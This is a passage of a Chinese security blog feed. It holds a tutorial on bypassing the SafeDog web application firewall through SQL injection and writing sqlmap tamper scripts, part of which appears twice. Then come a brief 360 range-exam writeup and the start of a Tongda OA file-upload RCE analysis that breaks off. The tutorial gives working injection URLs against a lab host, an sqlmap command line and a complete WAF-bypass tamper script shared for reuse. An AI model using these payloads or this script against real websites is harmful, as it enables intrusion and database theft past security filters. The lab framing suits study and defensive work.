tamper主要的三个部分</h1><ul><li>第一部分priority</li><li>定义脚本的优先级，用于有多个tamper脚本的先后顺序</li><li>第二部分dependencies函数</li><li>该脚本适用/不适用的范围，也可以不写。</li><li>第三部分tamper函数</li><li>主要就是我们绕过的精华，要替换的内容。</li></ul><p>priority优先级</p><p>使用了多个tamper时，PRIORITY的参数等级较高的tamper先使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br></pre></td></tr></table></figure><p>有大概七个等级 LOWEST LOWER = LOW NORMAL HIGH HIGHER HIGHEST</p><p>dependencies函数主要是提示用户适用范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上文中没写，就是没有提示，你要自己知道，其实不写也行就直接pass</span><br><span class="line">def dependencies():</span><br><span class="line">     singleTimeWarnMessage(&quot;这里输入想显示的内容“)</span><br></pre></td></tr></table></figure><p>tamper是重头戏</p><p>这是一个简单的双写绕过，tamper里面主要是一个替换的过程</p><p>payload就是那些关键词select union这下，经过替换只有return 回去，就是处理好的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&#39;union&#39;,&#39;uniounionn&#39;)</span><br></pre></td></tr></table></figure><p>所以中间具体怎么替换就是你的事情了。只有最后return回去就好了</p><h1 id="0x06-tamper编写测试方法"><a href="#0x06-tamper编写测试方法" class="headerlink" title="0x06 tamper编写测试方法"></a>0x06 tamper编写测试方法</h1><p>这里我说下几个坑点：</p><ul><li><p>手工过和写tamper不一样，sqlmap的语句和你用的并不一样</p></li><li><p>我有两个建议，一个是用slqmap 挂代理到burp去看到底可以不，我没用这个方法，点的有点累</p></li><li><p>我是打开 -v 参数，去看payload和提示，看哪里断开，复制payload去手工看看，绕过编写一下tamper</p></li><li><p>还有调试过程中 要打开–flush 参数刷新缓存</p></li><li><p>还有一个就是你的python代码能力了，如果你只是用简单的replace(）函数，就要注意替换的顺序，</p><ul><li>例如会用到的相似的函数：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SESSION_USER()  CURRENT_USER()  USER() </span><br><span class="line">这几个都有 user（） 如果你在最前面 替换了user（） </span><br><span class="line">那么后面就会出现CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;() 我这种绕过就不兼容了</span><br><span class="line">得在后面再自己调整</span><br></pre></td></tr></table></figure><ul><li>下面是我的绕过参数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1&quot; --tamper dogz.py --random-agent --flush -v 3 --batch --dbms mysql --current-user –-tech&#x3D;U</span><br></pre></td></tr></table></figure><h1 id="0x07-结束"><a href="#0x07-结束" class="headerlink" title="0x07 结束"></a>0x07 结束</h1><p>绕狗脚本给大家，如果跑的时候失效了可以按照上面的方法修改修改就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.7</span><br><span class="line"># Author:Zeo</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    singleTimeWarnMessage(&quot;Zeo_bypass_safedog4.0&quot;)</span><br><span class="line">    </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload&#x3D;payload.replace(&#39;AND&#39;,&#39;&#x2F;*!44466AND*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;ORDER&#39;,&#39;&#x2F;*!44466order*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;BY&#39;,&#39;%23a%0aby&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;USER()&#39;,&#39;%23a%0aUSER&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;DATABASE()&#39;,&#39;%23a%0aDATABASE&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;SESSION_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;%23a%0aSESSION_USER()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;UNION ALL SELECT&#39;,&#39;UNION ALL &#x2F;*!44466SELECT*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;CURRENT_USER()&#39;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>最终绕过安全狗成功跑出数据</p><p><img src="https://img-blog.csdnimg.cn/20200421092204127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的从绕狗到编写tamper</title>
      <link href="/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/"/>
      <url>/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><ul><li>安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的</li><li>但是实际情况是需要权衡可用性和安全性</li><li>当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截</li><li>所以最终就是正则的绕过</li><li>注意：</li><li>版本不同，他的正则规则也是不一样的</li><li>所以有的payload在新老版本是不能同吃。</li><li>但是没有关系，你学会这么绕，这都不是问题。</li></ul><h1 id="0x01-首先我们要判断哪个关键字被拦截了"><a href="#0x01-首先我们要判断哪个关键字被拦截了" class="headerlink" title="0x01 首先我们要判断哪个关键字被拦截了"></a>0x01 首先我们要判断哪个关键字被拦截了</h1><p>我们以 order by 3 这个简单的语句为例子</p><p>提供思路就是破坏单词去测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3  （拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 ordwer by 3 （破坏了order 没有拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order bay 3 （破坏了by 没有拦截）</span><br></pre></td></tr></table></figure><p>所以狗拦截的东西就是 order by 两个一起出现</p><p>所有后面的测试都是按照这个思路初步的判断。</p><h1 id="0x02-一些简单的知识点"><a href="#0x02-一些简单的知识点" class="headerlink" title="0x02 一些简单的知识点"></a>0x02 一些简单的知识点</h1><ul><li>绕过的一些基础</li><li>MySql注释内语句也可执行（/*! */）</li><li><code>/*! ....*/</code> 在其他很多地方都是注释。</li><li>但是在mysql中不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在<code>/*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!50001 select * from test *&#x2F;;</span><br></pre></td></tr></table></figure><p>这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行，基本上只做一个版本的判断。</p><ul><li>Mysql常用的符号</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">换行符号</span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">注释符合</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">空白字符</span><br><span class="line">&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;</span><br><span class="line"></span><br><span class="line">不同的数据库不太一样，可以自己查一下</span><br></pre></td></tr></table></figure><p>还有一些bypass的常用注释符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h1 id="0x03-总结安全狗拦截的点"><a href="#0x03-总结安全狗拦截的点" class="headerlink" title="0x03 总结安全狗拦截的点"></a>0x03 总结安全狗拦截的点</h1><ul><li>and 1</li><li>只要and后面接数字，安全狗就会拦截</li><li>order by</li><li>order 后面接by，安全狗就会拦截</li><li>union select</li><li>只要union select 结合就被拦截,实测发现还是对select这个词的更加严格，主要饶select</li><li>database()</li><li>database后面接括号，安全狗就会拦截</li></ul><p>下面是测试成功的例子</p><p>order by 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试 order aby不拦截 ，我们让 by前面的注释掉就可以绕过</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order %23a%0aby 3</span><br></pre></td></tr></table></figure><p>union select绕过 同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure><p>database()绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,%23a%0adatabase&#x2F;*!*&#x2F;(),3</span><br></pre></td></tr></table></figure><p>一个完整的union查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,group_concat(table_name),3 %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure><p>还有一种注释版本号的 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*!44466select*&#x2F; 1,database&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure><h1 id="0x04-Sqlmap-tamper的编写"><a href="#0x04-Sqlmap-tamper的编写" class="headerlink" title="0x04 Sqlmap tamper的编写"></a>0x04 Sqlmap tamper的编写</h1><p>tamper是sqlmap对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。</p><p>为了好理解直接典例深刨析：</p><p>我们理解一下一个常用的tamper ：space2comment.py </p><p>这个脚本的功能就是：用“/**/”替换空格符</p><p>下面是完整的代码</p><pre><code>#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    &quot;&quot;&quot;    Replaces space character (&apos; &apos;) with comments &apos;/**/&apos;    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    &gt;&gt;&gt; tamper(&apos;SELECT id FROM users&apos;)    &apos;SELECT/**/id/**/FROM/**/users&apos;    &quot;&quot;&quot;    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote, firstspace = False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += &quot;/**/&quot;                    continue            elif payload[i] == &apos;\&apos;&apos;:                quote = not quote            elif payload[i] == &apos;&quot;&apos;:                doublequote = not doublequote            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += &quot;/**/&quot;                continue            retVal += payload[i]    return retVal</code></pre><p>​    </p><h1 id="0x05-tamper主要的三个部分"><a href="#0x05-tamper主要的三个部分" class="headerlink" title="0x05 tamper主要的三个部分"></a>0x05 tamper主要的三个部分</h1><ul><li>第一部分priority</li><li>定义脚本的优先级，用于有多个tamper脚本的先后顺序</li><li>第二部分dependencies函数</li><li>该脚本适用/不适用的范围，也可以不写。</li><li>第三部分tamper函数</li><li>主要就是我们绕过的精华，要替换的内容。</li></ul><p>priority优先级</p><p>使用了多个tamper时，PRIORITY的参数等级较高的tamper先使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br></pre></td></tr></table></figure><p>有大概七个等级  LOWEST LOWER = LOW NORMAL HIGH HIGHER  HIGHEST</p><p>dependencies函数主要是提示用户适用范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上文中没写，就是没有提示，你要自己知道，其实不写也行就直接pass</span><br><span class="line">def dependencies():</span><br><span class="line">     singleTimeWarnMessage(&quot;这里输入想显示的内容“)</span><br></pre></td></tr></table></figure><p>tamper是重头戏</p><p>这是一个简单的双写绕过，tamper里面主要是一个替换的过程</p><p>payload就是那些关键词select union这下，经过替换只有return 回去，就是处理好的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&#39;union&#39;,&#39;uniounionn&#39;)</span><br></pre></td></tr></table></figure><p>所以中间具体怎么替换就是你的事情了。只有最后return回去就好了</p><h1 id="0x06-tamper编写测试方法"><a href="#0x06-tamper编写测试方法" class="headerlink" title="0x06 tamper编写测试方法"></a>0x06 tamper编写测试方法</h1><p>这里我说下几个坑点：</p><ul><li>手工过和写tamper不一样，sqlmap的语句和你用的并不一样</li><li>我有两个建议，一个是用slqmap 挂代理到burp去看到底可以不，我没用这个方法，点的有点累</li><li>我是打开 -v 参数，去看payload和提示，看哪里断开，复制payload去手工看看，绕过编写一下tamper</li><li>还有调试过程中 要打开–flush 参数刷新缓存</li><li>还有一个就是你的python代码能力了，如果你只是用简单的replace(）函数，就要注意替换的顺序，</li></ul><ul><li>例如会用到的相似的函数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SESSION_USER()  CURRENT_USER()  USER() </span><br><span class="line">这几个都有 user（） 如果你在最前面 替换了user（） </span><br><span class="line">那么后面就会出现CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;() 我这种绕过就不兼容了</span><br><span class="line">得在后面再自己调整</span><br></pre></td></tr></table></figure><ul><li>下面是我的绕过参数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1&quot; --tamper dogz.py --random-agent --flush -v 3 --batch --dbms mysql --current-user –-tech&#x3D;U</span><br></pre></td></tr></table></figure><h1 id="0x07-结束"><a href="#0x07-结束" class="headerlink" title="0x07 结束"></a>0x07 结束</h1><p>绕狗脚本给大家，如果跑的时候失效了可以按照上面的方法修改修改就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.7</span><br><span class="line"># Author:Zeo</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    singleTimeWarnMessage(&quot;Zeo_bypass_safedog4.0&quot;)</span><br><span class="line">    </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload&#x3D;payload.replace(&#39;AND&#39;,&#39;&#x2F;*!44466AND*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;ORDER&#39;,&#39;&#x2F;*!44466order*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;BY&#39;,&#39;%23a%0aby&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;USER()&#39;,&#39;%23a%0aUSER&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;DATABASE()&#39;,&#39;%23a%0aDATABASE&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;SESSION_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;%23a%0aSESSION_USER()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;UNION ALL SELECT&#39;,&#39;UNION ALL &#x2F;*!44466SELECT*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;CURRENT_USER()&#39;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>最终绕过安全狗成功跑出数据</p><p><img src="https://img-blog.csdnimg.cn/20200421092204127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次360众测仿真实战靶场考核WP</title>
      <link href="/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/"/>
      <url>/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-考核主要分为两部分"><a href="#0x00-考核主要分为两部分" class="headerlink" title="0x00 考核主要分为两部分"></a>0x00 考核主要分为两部分</h1><ul><li><p>第一部分为客观题：分为单选题，多选题，和判断题。</p><p>我记录了一道有趣的题，也是不清楚正确答案的群</p></li><li><p>第二部分为操作题：</p></li></ul><h1 id="0x01客观题"><a href="#0x01客观题" class="headerlink" title="0x01客观题"></a>0x01客观题</h1><p>我记录了一道有趣的题，也是不清楚正确答案，有大佬知道吗</p><p><img src="https://img-blog.csdnimg.cn/2020040611053972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x02-操作题"><a href="#0x02-操作题" class="headerlink" title="0x02:操作题"></a>0x02:操作题</h1><ul><li>源码分析题，给你源码提及一个数据</li></ul><p><img src="https://img-blog.csdnimg.cn/20200406110455129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>PHP == 弱语言绕过 ，因为没弄过CTF也是印象比较深刻</p><ul><li>网站被黑，可以下载整站，找后门</li></ul><p>下载源码，找见后门webshell，看一眼，变形的一句话，连上</p><ul><li>一个加密的一句话木马</li></ul><p>就普通一句话各种decode</p><ul><li>IP伪造登陆 X-FORWORD</li></ul><p>只能客户端登陆</p><ul><li>一个弹幕网站</li></ul><p>进去发现是Struts2的，有工具一把梭</p><ul><li>xxx系统的数据库系统。postgresql</li></ul><p>识别出来是postgresql，但是连上了啥也没找到，没做出来。。。</p><ul><li>一个登录框</li></ul><p>点点发现有注入，sqlmap直接跑了</p><ul><li>wireshark分析数据包的</li></ul><p>有人改了数据库密码 找到修改的 数据库密码</p><ul><li>wireshark分析数据包的</li></ul><p>删除数据库记录的ip</p><ul><li>wireshark分析数据包的</li></ul><p>找上传者的ip</p><p>0x03 总结：</p><p>1、感觉是给我分的题不是很难，所以还行感觉</p><p>2、wireshark稍微看一下，其实有技巧，搜索关键字就行</p><p>3、主要是题型的分辩，知道考啥就好说，常见的CVE多复现，多练练就好了</p><p><img src="https://img-blog.csdnimg.cn/20200406110415461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意文件上传/文件包含RCE漏洞分析</title>
      <link href="/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="通达OA任意文件上传-文件包含RCE漏洞分析"><a href="#通达OA任意文件上传-文件包含RCE漏洞分析" class="headerlink" title="通达OA任意文件上传/文件包含RCE漏洞分析"></a>通达OA任意文件上传/文件包含RCE漏洞分析</h3><ul><li><a href="#0x01__4">0x01 前提</a></li><li><a href="#0x01__19">0x01 漏洞介绍</a></li><li><a href="#0x02__40">0x02 漏洞分析</a></li><li><ul><li><a href="#_53">首先下载安装</a></li><li><a href="#_63">绕过身份验证文件上传部分</a></li><li><a href="#_356">变量传递问题</a></li><li><a href="#_484">文件包含部分</a></li></ul></li></ul><h1 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h1><p>关于这个漏洞的利用方式：</p><p>​</p><p>利用方式大致有两种：</p><ol><li>包含日志文件。</li><li>绕过身份验证文件上传然后在文件包含。</li></ol><p>下面主要分析第二种</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p>_通达OA_系统代表了协同OA的先进理念,16年研发铸就成熟OA产品,协同OA软件行业唯一央企团队研发,多次摘取国内OA软件金奖,拥有2万多家正式用户,8万多家免费版用户,超过…</p><p>主要危害：</p><p>攻击者可以在为登陆或者说，无任何条件触发漏洞，上传图片木马文件，请求进行文件包含最终可达成远程命令执行</p><p>影响版本：</p><ul><li>V11版</li><li>2017版</li><li>2016版</li><li>2015版</li><li>2013版</li><li>2013增强版</li></ul><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>我用的官网下载的V11.3</p><p>利用方式大致有两种：</p><ol><li>包含日志文件。</li><li>绕过身份验证文件上传然后在文件包含。</li></ol><p>下面我主要分析饶过权限上传，然后文件包含的方式：</p><h2 id="首先下载安装"><a href="#首先下载安装" class="headerlink" title="首先下载安装"></a>首先下载安装</h2><p>打开源码一看，都加密了，使用zend进行了加密。</p><p>所以先要进行解密，百度即可。</p><p><img src="https://img-blog.csdnimg.cn/20200330094732543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="绕过身份验证文件上传部分"><a href="#绕过身份验证文件上传部分" class="headerlink" title="绕过身份验证文件上传部分"></a>绕过身份验证文件上传部分</h2><p>存在漏洞的上传功能文件为 webroot\ispirit\im\upload.php</p><p>解密后的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 